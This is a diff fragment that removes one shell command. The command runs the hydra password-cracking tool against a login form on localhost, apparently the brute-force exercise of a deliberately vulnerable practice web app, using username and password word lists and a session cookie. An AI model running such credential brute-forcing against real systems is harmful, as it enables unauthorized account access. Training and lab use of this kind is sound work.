@@ -1,2 +1,0 @@
-sudo hydra -L username.txt -P password.txt "http-get-form://localhost:4280/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=bdp4gm8jmd3csaovur15106o80; security=low:F=Username and/or password incorrect."
-
